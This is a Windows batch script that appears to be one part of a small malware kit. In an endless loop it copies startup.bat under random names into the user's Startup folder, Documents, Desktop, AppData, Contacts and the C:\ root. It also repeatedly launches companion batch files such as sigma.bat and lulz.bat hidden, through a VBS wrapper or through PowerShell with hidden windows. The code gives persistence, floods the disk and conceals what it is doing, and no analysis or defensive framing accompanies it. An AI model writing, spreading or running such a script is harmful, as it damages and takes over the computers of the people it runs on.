@echo off

setlocal
set "vbsFile=%PUBLIC%\vbs\file.vbs"

:loop

copy "%PUBLIC%\sigma\startup.bat" "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\mk%random%4.bat"
copy "%PUBLIC%\sigma\startup.bat" "%USERPROFILE%\Documents\mk%random%4.bat"
copy "%PUBLIC%\sigma\startup.bat" "%USERPROFILE%\Desktop\mk%random%4.bat"
copy "%PUBLIC%\sigma\startup.bat" "%USERPROFILE%\AppData\mk%random%4.bat"
copy "%PUBLIC%\sigma\startup.bat" "%USERPROFILE%\Contacts\mk%random%4.bat"
copy "%PUBLIC%\sigma\startup.bat" "C:\mk%random%4.bat"

if exist "%vbsFile%" (
    wscript "%vbsFile%" "%PUBLIC%\sigma\filel.bat"
    wscript "%vbsFile%" "%PUBLIC%\sigma\file.bat"
    wscript "%vbsFile%" "%PUBLIC%\sigma\sigma.bat"
    wscript "%vbsFile%" "%PUBLIC%\sigma\copy.bat"
    wscript "%vbsFile%" "%PUBLIC%\sigma\startup.bat"
    wscript "%vbsFile%" "%PUBLIC%\sigma\lulz.bat"
) else (
    powershell -WindowStyle Hidden -File "%PUBLIC%\sigma\file.bat"
    powershell -WindowStyle Hidden -File "%PUBLIC%\sigma\sigma.bat"
    powershell -WindowStyle Hidden -File "%PUBLIC%\sigma\copy.bat"
    powershell -WindowStyle Hidden -File "%PUBLIC%\sigma\startup.bat"
    powershell -WindowStyle Hidden -File "%PUBLIC%\sigma\filel.bat"
    powershell -WindowStyle Hidden -File "%PUBLIC%\sigma\lulz.bat"
)

goto loop
